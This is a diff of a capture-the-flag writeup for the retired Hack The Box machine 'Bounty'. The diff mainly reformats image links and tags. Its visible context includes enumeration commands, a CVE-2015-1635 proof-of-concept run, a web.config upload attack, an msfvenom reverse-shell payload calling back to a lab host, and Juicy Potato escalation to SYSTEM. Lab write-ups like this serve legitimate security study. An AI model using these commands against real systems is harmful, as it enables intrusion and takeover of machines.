@@ -2,14 +2,7 @@
 title: HTB Machine Bounty May 2025
 published: 2025-05-17
 description: Writeup of HTB Bounty Machine.
-tags:
-  - B2R
-  - HTB
-  - Retired
-  - Easy
-  - Metasploit
-  - Windows
-  - MS10-092
+tags: [B2R, HTB, Retired, Easy, Metasploit, Windows, MS10-092]
 image: images/cover.png
 category: HTB Machine Writeups
 draft: false
@@ -24,7 +17,7 @@ bash
 rustscan -a 10.10.10.93 -r 1-1000 -b 100
 ```
 
-![[Pasted image 20250518141803.png]]
+![Pasted image 20250518141803.png](images/Pasted_image_20250518141803.png)
 
 ## Nmap
 
@@ -56,7 +49,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 - The IIS Server version (7.5) is very old, suggesting potential exploits might exist.
 - The machine is likely running Windows based on the service information.
 
-![[Pasted image 20250518150637.png]]
+![Pasted image 20250518150637.png](images/Pasted_image_20250518150637.png)
 
 # Enumeration
 
@@ -68,17 +61,17 @@ bash
 ffuf -u http://10.10.10.93/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 150
 ```
 
-![[Pasted image 20250518151418.png]]
+![Pasted image 20250518151418.png](images/Pasted_image_20250518151418.png)
 
 - I discovered that there's an exploit for older versions of IIS that might help bypass access restrictions.
 
-![[Pasted image 20250518151707.png]]
+![Pasted image 20250518151707.png](images/Pasted_image_20250518151707.png)
 
 - Reference: [https://www.exploit-db.com/exploits/19033](https://www.exploit-db.com/exploits/19033)
 
-![[Pasted image 20250518151743.png]]
+![Pasted image 20250518151743.png](images/Pasted_image_20250518151743.png)
 
-![[Pasted image 20250518151928.png]]
+![Pasted image 20250518151928.png](images/Pasted_image_20250518151928.png)
 
 yml
 
@@ -120,7 +113,7 @@ bash
 python CVE-2015-1635-POC.py -t 10.10.10.93
 ```
 
-![[Pasted image 20250518154217.png]]
+![Pasted image 20250518154217.png](images/Pasted_image_20250518154217.png)
 
 - Surprise! This whole path turned out to be a rabbit hole! 🐰
 - I had been following a writeup that went down this same unfruitful path, and I confidently followed along. 😗
@@ -131,7 +124,7 @@ python CVE-2015-1635-POC.py -t 10.10.10.93
 - The actual vulnerability was much simpler - there's an ASPX page called `transfer.aspx` that allows file uploads.
 - Unfortunately, my directory discovery tools missed this file despite trying different wordlists and techniques. 😒
 
-![[Pasted image 20250518155952.png]]
+![Pasted image 20250518155952.png](images/Pasted_image_20250518155952.png)
 
 ## Solution Explanation
 
@@ -140,7 +133,7 @@ python CVE-2015-1635-POC.py -t 10.10.10.93
 - This time, I successfully found `transfer.aspx`.
 - When I tried to upload a text file, it returned "invalid file":
 
-![[Pasted image 20250518165401.png]]
+![Pasted image 20250518165401.png](images/Pasted_image_20250518165401.png)
 
 - This meant I needed to discover which file extensions were permitted. While Burp Suite's Intruder could be used, it would be painfully slow for this task, so I opted for `ffuf` instead.
 - The command for extension bruteforcing:
@@ -193,7 +186,7 @@ Upload
 
 - By analyzing the response sizes, I was able to filter out these three interesting file extensions:
 
-![[Pasted image 20250518171122.png]]
+![Pasted image 20250518171122.png](images/Pasted_image_20250518171122.png)
 
 r
 
@@ -205,7 +198,7 @@ r
 
 - Success! The file with .config extension was uploaded:
 
-![[Pasted image 20250518171531.png]]
+![Pasted image 20250518171531.png](images/Pasted_image_20250518171531.png)
 
 # Exploitation
 
@@ -248,7 +241,7 @@ Response.Write(o)
     - The ASP code embedded in HTML comments executes system commands
     - The server processes this file and runs our commands with the server's privileges
 
-![[Pasted image 20250518174605.png]] ![[Pasted image 20250518174553.png]] ![[Pasted image 20250518174619.png]]
+![Pasted image 20250518174605.png](images/Pasted_image_20250518174605.png) ![Pasted image 20250518174553.png](images/Pasted_image_20250518174553.png) ![Pasted image 20250518174619.png](images/Pasted_image_20250518174619.png)
 
 - For a proper reverse shell, I used [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) with an added command at the end:
 
@@ -293,9 +286,9 @@ Response.Write(o)
 
 - After uploading the file and accessing it, I successfully received a shell connection!
 
-![[Pasted image 20250519173807.png]] ![[Pasted image 20250519173743.png]]
+![Pasted image 20250519173807.png](images/Pasted_image_20250519173807.png) ![Pasted image 20250519173743.png](images/Pasted_image_20250519173743.png)
 
-![[Pasted image 20250519174001.png]]
+![Pasted image 20250519174001.png](images/Pasted_image_20250519174001.png)
 
 - User Flag:
 
@@ -309,7 +302,7 @@ lua
 
 - After checking permissions with `whoami /priv`, I discovered that `SeImpersonatePrivilege` was enabled. This is perfect for using the [Juicy Potato](https://github.com/ohpe/juicy-potato) privilege escalation technique.
 
-![[Pasted image 20250519212835.png]]
+![Pasted image 20250519212835.png](images/Pasted_image_20250519212835.png)
 
 ## What is SeImpersonatePrivilege?
 
@@ -322,7 +315,7 @@ lua
 
 - First, I uploaded the Juicy Potato executable as jp.exe:
 
-![[Pasted image 20250519213514.png]]
+![Pasted image 20250519213514.png](images/Pasted_image_20250519213514.png)
 
 - Next, I generated a reverse shell payload using msfvenom:
 
@@ -334,7 +327,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe -o 
 
 - Then uploaded this reverse shell executable:
 
-![[Pasted image 20250519213413.png]]
+![Pasted image 20250519213413.png](images/Pasted_image_20250519213413.png)
 
 - Finally, I executed Juicy Potato with the following command to trigger my reverse shell as NT AUTHORITY\SYSTEM:
 
@@ -349,11 +342,11 @@ jp.exe -l 1337 -t * -p reverse.exe
     - It then captures and impersonates that high-privilege token
     - Finally, it launches our payload with those elevated privileges
 
-![[Pasted image 20250519213829.png]]
+![Pasted image 20250519213829.png](images/Pasted_image_20250519213829.png)
 
 - Success! I obtained the root flag:
 
-![[Pasted image 20250519213946.png]]
+![Pasted image 20250519213946.png](images/Pasted_image_20250519213946.png)
 
 lua
 
